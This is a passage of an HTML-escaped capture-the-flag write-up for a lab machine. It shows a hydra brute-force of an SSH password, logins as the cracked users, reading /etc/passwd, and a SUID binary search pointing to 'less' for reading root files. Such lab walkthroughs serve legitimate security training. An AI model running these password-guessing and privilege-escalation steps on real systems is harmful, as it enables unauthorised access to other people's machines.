&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Warning: Permanently added &amp;#39;&lt;/span>10.10.127.58&lt;span class="s1">&amp;#39; (ED25519) to the list of known hosts.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">holts@10.10.127.58&amp;#39;&lt;/span>s password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Permission denied, please try again.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">holts@10.10.127.58&lt;span class="s1">&amp;#39;s password:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Permission denied, please try again.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">holts@10.10.127.58&amp;#39;&lt;/span>s password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">holts@10.10.127.58: Permission denied &lt;span class="o">(&lt;/span>publickey,password&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>But if I remember jake had a bad password, so I am going to try and brute force ssh with jake:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.127.58
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hydra v9.5 &lt;span class="o">(&lt;/span>c&lt;span class="o">)&lt;/span> &lt;span class="m">2023&lt;/span> by van Hauser/THC &lt;span class="p">&amp;amp;&lt;/span> David Maciejak - Please &lt;span class="k">do&lt;/span> not use in military or secret service organizations, or &lt;span class="k">for&lt;/span> illegal purposes &lt;span class="o">(&lt;/span>this is non-binding, these *** ignore laws and ethics anyway&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hydra &lt;span class="o">(&lt;/span>https://github.com/vanhauser-thc/thc-hydra&lt;span class="o">)&lt;/span> starting at 2024-01-27 13:38:44
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>WARNING&lt;span class="o">]&lt;/span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t &lt;span class="m">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>DATA&lt;span class="o">]&lt;/span> max &lt;span class="m">16&lt;/span> tasks per &lt;span class="m">1&lt;/span> server, overall &lt;span class="m">16&lt;/span> tasks, &lt;span class="m">14344399&lt;/span> login tries &lt;span class="o">(&lt;/span>l:1/p:14344399&lt;span class="o">)&lt;/span>, ~896525 tries per task
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>DATA&lt;span class="o">]&lt;/span> attacking ssh://10.10.127.58:22/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>22&lt;span class="o">][&lt;/span>ssh&lt;span class="o">]&lt;/span> host: 10.10.127.58 login: jake password: &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And I got jake’s password&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh jake@10.10.127.58
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jake@10.10.127.58&lt;span class="err">&amp;#39;&lt;/span>s password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Tue May &lt;span class="m">26&lt;/span> 08:56:58 &lt;span class="m">2020&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jake@brookly_nine_nine:~$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jake
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jake@brookly_nine_nine:~$ ls
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Jake’s directory is empty.&lt;/p>
&lt;p>We can confirm the usernames:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /etc/passwd &lt;span class="p">|&lt;/span> grep home
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">syslog:x:102:106::/home/syslog:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">amy:x:1001:1001:,,,:/home/amy:/bin/bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">holt:x:1002:1002:,,,:/home/holt:/bin/bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jake:x:1000:1000:,,,:/home/jake:/bin/bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Ok, and apparently the name was wrong, it’s actually holt, not holts…&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh holt@10.10.127.58
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">holt@10.10.127.58&lt;span class="err">&amp;#39;&lt;/span>s password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Tue May &lt;span class="m">26&lt;/span> 08:59:00 &lt;span class="m">2020&lt;/span> from 10.10.10.18
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">holt@brookly_nine_nine:~$ ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nano.save user.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So now we got 2 users.&lt;/p>
&lt;p>Ok, I actually found 3 ways to get the root flag…&lt;/p>
&lt;p>First of all:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find / -type f -perm -04000 -ls 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2205&lt;/span> &lt;span class="m">428&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">436552&lt;/span> Mar &lt;span class="m">4&lt;/span> &lt;span class="m">2019&lt;/span> /usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">8400&lt;/span> &lt;span class="m">100&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">100760&lt;/span> Nov &lt;span class="m">23&lt;/span> &lt;span class="m">2018&lt;/span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7837&lt;/span> &lt;span class="m">108&lt;/span> -rwsr-sr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">109432&lt;/span> Oct &lt;span class="m">30&lt;/span> &lt;span class="m">2019&lt;/span> /usr/lib/snapd/snap-confine
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2209&lt;/span> &lt;span class="m">16&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">14328&lt;/span> Mar &lt;span class="m">27&lt;/span> &lt;span class="m">2019&lt;/span> /usr/lib/policykit-1/polkit-agent-helper-1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2016&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root messagebus &lt;span class="m">42992&lt;/span> Jun &lt;span class="m">10&lt;/span> &lt;span class="m">2019&lt;/span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2023&lt;/span> &lt;span class="m">12&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">10232&lt;/span> Mar &lt;span class="m">28&lt;/span> &lt;span class="m">2017&lt;/span> /usr/lib/eject/dmcrypt-get-device
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1652&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">37136&lt;/span> Mar &lt;span class="m">22&lt;/span> &lt;span class="m">2019&lt;/span> /usr/bin/newgidmap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1653&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40344&lt;/span> Mar &lt;span class="m">22&lt;/span> &lt;span class="m">2019&lt;/span> /usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1690&lt;/span> &lt;span class="m">24&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">22520&lt;/span> Mar &lt;span class="m">27&lt;/span> &lt;span class="m">2019&lt;/span> /usr/bin/pkexec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1654&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">37136&lt;/span> Mar &lt;span class="m">22&lt;/span> &lt;span class="m">2019&lt;/span> /usr/bin/newuidmap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1448&lt;/span> &lt;span class="m">76&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">76496&lt;/span> Mar &lt;span class="m">22&lt;/span> &lt;span class="m">2019&lt;/span> /usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1795&lt;/span> &lt;span class="m">148&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">149080&lt;/span> Jan &lt;span class="m">31&lt;/span> &lt;span class="m">2020&lt;/span> /usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1450&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44528&lt;/span> Mar &lt;span class="m">22&lt;/span> &lt;span class="m">2019&lt;/span> /usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1397&lt;/span> &lt;span class="m">52&lt;/span> -rwsr-sr-x &lt;span class="m">1&lt;/span> daemon daemon &lt;span class="m">51464&lt;/span> Feb &lt;span class="m">20&lt;/span> &lt;span class="m">2018&lt;/span> /usr/bin/at
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1831&lt;/span> &lt;span class="m">20&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">18448&lt;/span> Jun &lt;span class="m">28&lt;/span> &lt;span class="m">2019&lt;/span> /usr/bin/traceroute6.iputils
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1543&lt;/span> &lt;span class="m">76&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">75824&lt;/span> Mar &lt;span class="m">22&lt;/span> &lt;span class="m">2019&lt;/span> /usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1670&lt;/span> &lt;span class="m">60&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">59640&lt;/span> Mar &lt;span class="m">22&lt;/span> &lt;span class="m">2019&lt;/span> /usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">66&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40152&lt;/span> Jan &lt;span class="m">27&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core/9066/bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">80&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44168&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /snap/core/9066/bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">81&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44680&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /snap/core/9066/bin/ping6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">98&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40128&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/9066/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">116&lt;/span> &lt;span class="m">27&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">27608&lt;/span> Jan &lt;span class="m">27&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core/9066/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2670&lt;/span> &lt;span class="m">71&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">71824&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/9066/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2672&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40432&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/9066/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2748&lt;/span> &lt;span class="m">74&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">75304&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/9066/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2840&lt;/span> &lt;span class="m">39&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">39904&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/9066/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2853&lt;/span> &lt;span class="m">53&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">54256&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/9066/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2963&lt;/span> &lt;span class="m">134&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">136808&lt;/span> Jan &lt;span class="m">31&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core/9066/usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3062&lt;/span> &lt;span class="m">42&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root systemd-resolve &lt;span class="m">42992&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3432&lt;/span> &lt;span class="m">419&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">428240&lt;/span> Mar &lt;span class="m">4&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/9066/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">6470&lt;/span> &lt;span class="m">109&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">110792&lt;/span> Apr &lt;span class="m">10&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core/9066/usr/lib/snapd/snap-confine
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7646&lt;/span> &lt;span class="m">386&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root dip &lt;span class="m">394984&lt;/span> Feb &lt;span class="m">11&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core/9066/usr/sbin/pppd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">66&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40152&lt;/span> Oct &lt;span class="m">10&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">80&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44168&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /snap/core/8268/bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">81&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44680&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /snap/core/8268/bin/ping6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">98&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40128&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">116&lt;/span> &lt;span class="m">27&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">27608&lt;/span> Oct &lt;span class="m">10&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2665&lt;/span> &lt;span class="m">71&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">71824&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2667&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40432&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2743&lt;/span> &lt;span class="m">74&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">75304&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2835&lt;/span> &lt;span class="m">39&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">39904&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2848&lt;/span> &lt;span class="m">53&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">54256&lt;/span> Mar &lt;span class="m">25&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2958&lt;/span> &lt;span class="m">134&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">136808&lt;/span> Oct &lt;span class="m">11&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3057&lt;/span> &lt;span class="m">42&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root systemd-resolve &lt;span class="m">42992&lt;/span> Jun &lt;span class="m">10&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3427&lt;/span> &lt;span class="m">419&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">428240&lt;/span> Mar &lt;span class="m">4&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">6462&lt;/span> &lt;span class="m">105&lt;/span> -rwsr-sr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">106696&lt;/span> Dec &lt;span class="m">6&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core/8268/usr/lib/snapd/snap-confine
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7636&lt;/span> &lt;span class="m">386&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root dip &lt;span class="m">394984&lt;/span> Jun &lt;span class="m">12&lt;/span> &lt;span class="m">2018&lt;/span> /snap/core/8268/usr/sbin/pppd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">131867&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">43088&lt;/span> Jan &lt;span class="m">8&lt;/span> &lt;span class="m">2020&lt;/span> /bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">131907&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44664&lt;/span> Mar &lt;span class="m">22&lt;/span> &lt;span class="m">2019&lt;/span> /bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">131891&lt;/span> &lt;span class="m">64&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">64424&lt;/span> Jun &lt;span class="m">28&lt;/span> &lt;span class="m">2019&lt;/span> /bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">131840&lt;/span> &lt;span class="m">32&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">30800&lt;/span> Aug &lt;span class="m">11&lt;/span> &lt;span class="m">2016&lt;/span> /bin/fusermount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">131851&lt;/span> &lt;span class="m">168&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">170760&lt;/span> Dec &lt;span class="m">1&lt;/span> &lt;span class="m">2017&lt;/span> /bin/less
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">131925&lt;/span> &lt;span class="m">28&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">26696&lt;/span> Jan &lt;span class="m">8&lt;/span> &lt;span class="m">2020&lt;/span> /bin/umount
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see that less has the SUID set.&lt;/p>
&lt;p>that means that we can use less to read file inside the root folder:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
